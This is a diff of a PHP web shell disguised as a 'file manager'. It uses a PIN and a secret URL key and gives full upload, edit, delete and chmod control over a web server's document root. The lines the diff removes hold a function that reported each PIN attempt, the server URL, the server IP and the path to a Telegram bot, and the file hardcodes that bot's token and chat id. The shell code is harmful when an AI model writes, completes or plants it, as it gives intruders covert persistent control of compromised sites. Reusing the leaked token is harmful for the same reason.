@@ -1,50 +1,21 @@
 <?php
+/**
+ * PLATINUM FILE MANAGER V10 - 2026
+ * Features: PIN Auth, Telegram Notify, File/Dir Creator, Color Perms, Editor
+ */
 @session_start();
 @set_time_limit(0);
 @error_reporting(0);
 
+// --- CONFIGURATION ---
 $pin_akses = '070999';
 $key       = 'cuceng';
 $bot_token = '8446042299:AAHVoRIsQfUwg1rzvP5tJQuKOe4QF7BaUbM';
 $chat_id   = '6664061200';
 
-function send_tele_notif($token, $chat_id, $status, $pin_attempt) {
-    $domain = $_SERVER['HTTP_HOST'];
-    $request_url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$domain" . $_SERVER['REQUEST_URI'];
-    $user_ip = $_SERVER['REMOTE_ADDR'];
-    $target_ip = $_SERVER['SERVER_ADDR'] ?: gethostbyname($domain);
-    $date = date('Y-m-d H:i:s');
-    $path = str_replace("\\", "/", getcwd());
-
-    $msg = "🔔 <b>CAPZ SHELL ACCESS DETECTED</b>\n\n";
-    $msg .= "📡 <b>Status:</b> $status\n";
-    $msg .= "🌐 <b>URL:</b> $request_url\n";
-    $msg .= "🔑 <b>PIN:</b> $pin_attempt\n";
-    $msg .= "🎯 <b>Target IP:</b> $target_ip\n";
-    $msg .= "👤 <b>User IP:</b> $user_ip\n";
-    $msg .= "📅 <b>Date:</b> $date\n";
-    $msg .= "📁 <b>Full Path:</b> $path";
-
-    $url = "https://api.telegram.org/bot$token/sendMessage";
-    $data = ['chat_id' => $chat_id, 'text' => $msg, 'parse_mode' => 'html'];
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_exec($ch);
-    curl_close($ch);
-}
-
+// --- AUTHENTICATION SYSTEM ---
 if (isset($_GET['logout'])) { unset($_SESSION['auth']); header("Location: ?resmi=$key"); exit; }
-
-if (isset($_POST['pin'])) {
-    if ($_POST['pin'] == $pin_akses) {
-        $_SESSION['auth'] = 'ok';
-        send_tele_notif($bot_token, $chat_id, "✅ SUCCESS LOGIN", $_POST['pin']);
-    } else {
-        send_tele_notif($bot_token, $chat_id, "❌ WRONG PIN ATTEMPT", $_POST['pin']);
-    }
-}
+if (isset($_POST['pin']) && $_POST['pin'] == $pin_akses) { $_SESSION['auth'] = 'ok'; }
 
 if ($_SESSION['auth'] != 'ok') {
     die("<html><head><title>Secure Access</title><meta name='viewport' content='width=device-width, initial-scale=1'><style>
@@ -52,15 +23,18 @@ if ($_SESSION['auth'] != 'ok') {
         .login { border:1px solid #0f0; padding:30px; border-radius:10px; box-shadow:0 0 15px #0f0; text-align:center; }
         input { background:#000; border:1px solid #0f0; color:#0f0; padding:10px; margin:10px 0; width:100%; text-align:center; outline:none; }
         button { background:#0f0; color:#000; border:none; padding:10px 20px; cursor:pointer; font-weight:bold; width:100%; }
+        button:hover { background:#0c0; }
     </style></head><body>
     <div class='login'><h2>SYSTEM ACCESS</h2><form method='POST'><input type='password' name='pin' placeholder='ENTER PIN' autofocus><br><button type='submit'>LOGIN</button></form></div>
     </body></html>");
 }
 
+// --- FILE ACTIONS (CRUD) ---
 $root = str_replace("\\", "/", $_SERVER['DOCUMENT_ROOT']);
 $p = isset($_GET["path"]) ? $_GET["path"] : $root;
 $p = str_replace("\\", "/", $p);
 
+// Delete/Rename/Chmod
 if(isset($_POST["exe"])){
     $t = $p . "/" . $_POST["it_n"];
     if($_POST["opt"] == "delete") { (is_dir($t)) ? @rmdir($t) : @unlink($t); }
@@ -69,10 +43,16 @@ if(isset($_POST["exe"])){
     header("Location: ?resmi=$key&path=$p"); exit;
 }
 
+// Create Folder/File via UI
 if(isset($_POST['new_folder'])){ @mkdir($p . "/" . $_POST['folder_name']); }
 if(isset($_POST['new_file'])){ @file_put_contents($p . "/" . $_POST['file_name'], $_POST['file_content']); }
+
+// Upload
 if(isset($_FILES["f"])){ @copy($_FILES["f"]["tmp_name"], $p . "/" . $_FILES["f"]["name"]); }
+
+// Save Editor
 if(isset($_POST["save_edit"])){ @file_put_contents($_POST["ef"], $_POST["cnt"]); }
+
 ?>
 <!DOCTYPE html>
 <html>
@@ -100,17 +80,18 @@ if(isset($_POST["save_edit"])){ @file_put_contents($_POST["ef"], $_POST["cnt"]);
             <strong>PLATINUM MANAGER V10</strong>
             <span>IP: <?php echo $_SERVER['REMOTE_ADDR']; ?> | <a href="?logout" style="color:red;">LOGOUT</a></span>
         </div>
+
         <div style="margin-bottom:15px;">
             PATH: <?php 
             $path_links = explode("/", $p);
             $accumulated_path = "";
             foreach($path_links as $id => $link) {
-                if($link == "") continue;
                 $accumulated_path .= $link . "/";
-                echo "<a href='?resmi=$key&path=".urlencode($accumulated_path)."'>$link</a> / ";
+                echo "<a href='?resmi=$key&path=$accumulated_path'>$link</a> / ";
             }
             ?>
         </div>
+
         <div style="display:flex; gap:10px; flex-wrap:wrap;">
             <form method="POST" enctype="multipart/form-data">
                 <input type="file" name="f"> <input type="submit" value="UPLOAD" class="btn">
@@ -119,9 +100,15 @@ if(isset($_POST["save_edit"])){ @file_put_contents($_POST["ef"], $_POST["cnt"]);
                 <input type="text" name="folder_name" placeholder="New Folder"> <input type="submit" name="new_folder" value="MKDIR" class="btn">
             </form>
         </div>
+
         <table>
             <thead>
-                <tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr>
+                <tr>
+                    <th>Name</th>
+                    <th>Size</th>
+                    <th>Perms</th>
+                    <th>Actions</th>
+                </tr>
             </thead>
             <tbody>
                 <?php
@@ -132,8 +119,9 @@ if(isset($_POST["save_edit"])){ @file_put_contents($_POST["ef"], $_POST["cnt"]);
                     $perms = substr(sprintf('%o', fileperms($tp)), -4);
                     $cl = "perm-" . $perms;
                     $size = is_dir($tp) ? "DIR" : round(filesize($tp)/1024, 2) . " KB";
+                    
                     echo "<tr>
-                        <td><a href='?resmi=$key&".(is_dir($tp)?"path=".urlencode($tp):"edit=".urlencode($tp)."&path=".urlencode($p))."'>".(is_dir($tp)?"📁 ":"📄 ")."$v</a></td>
+                        <td><a href='?resmi=$key&".(is_dir($tp)?"path=$tp":"edit=$tp&path=$p")."'>".(is_dir($tp)?"📁 ":"📄 ")."$v</a></td>
                         <td>$size</td>
                         <td class='$cl'>$perms</td>
                         <td>
@@ -153,6 +141,7 @@ if(isset($_POST["save_edit"])){ @file_put_contents($_POST["ef"], $_POST["cnt"]);
                 ?>
             </tbody>
         </table>
+
         <?php if(isset($_GET['edit'])): ?>
         <div style="margin-top:20px; border-top:1px solid #0f0; padding-top:15px;">
             <strong>EDITOR: <?php echo basename($_GET['edit']); ?></strong>
